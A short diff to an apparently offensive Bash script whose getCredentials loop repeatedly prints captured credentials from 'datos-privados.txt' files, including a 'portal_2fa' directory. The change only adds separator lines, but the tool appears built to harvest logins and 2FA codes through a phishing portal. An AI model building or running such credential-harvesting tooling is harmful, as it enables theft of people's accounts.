@@ -79,8 +79,9 @@ function getCredentials(){
 
 	while true; do
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
-		sleep 1
+		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		cat datos-privados.txt portal_2fa/datos-privados.txt 2>/dev/null
+		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		sleep 3; clear
 	done
 }
